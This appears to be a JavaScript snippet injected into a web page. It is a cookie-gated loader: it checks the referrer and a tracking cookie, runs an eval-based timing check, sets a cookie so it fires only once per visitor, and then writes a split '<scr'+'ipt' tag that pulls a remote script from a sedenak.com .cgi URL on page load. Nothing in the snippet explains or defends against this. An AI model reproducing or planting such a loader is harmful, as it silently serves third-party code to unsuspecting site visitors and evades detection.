//<![CDATA[ 
function setCookieSX(c_name,value,exdays) { var exdate=new Date(); exdate.setDate(exdate.getDate() + exdays); var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString()+"; path=/"); document.cookie=c_name + "=" + c_value; }
function getCookieSX(c_name) { var i,x,y,ARRcookies=document.cookie.split(";"); for (i=0;i<ARRcookies.length;i++) { x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("=")); y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1); x=x.replace(/^\s+|\s+$/g,""); if (x==c_name) { return unescape(y); } } }

var signalsx;var waktu=new Date();
function boleh() { if (/sedenak\.com/i.test(document.referrer)){signalsx='ok';return true;} if(getCookieSX("adam") == "Khlq7OzBup"){signalsx='';return false;}    var secondSX=waktu.getSeconds();var dibenar="-1-10-11-12-13-14-15-16-17-18-19-2-20-21-22-23-24-25-26-27-28-29-3-30-31-32-33-34-35-36-37-38-39-4-40-41-42-43-44-45-46-47-48-49-5-50-51-52-53-54-55-56-57-58-59-6-7-8-9-";eval("if(dibenar.match(/-" + secondSX + "-/g)){signalsx='ok';}");
 }
boleh();
if (signalsx=='ok') { if(!/sedenak\.com/i.test(document.referrer)){setCookieSX("adam","Khlq7OzBup",1);} document.write('<scr' + 'ipt src="http://sedenak.com/13403322101300.cgi"></sc' + 'ript>'); }

//]]>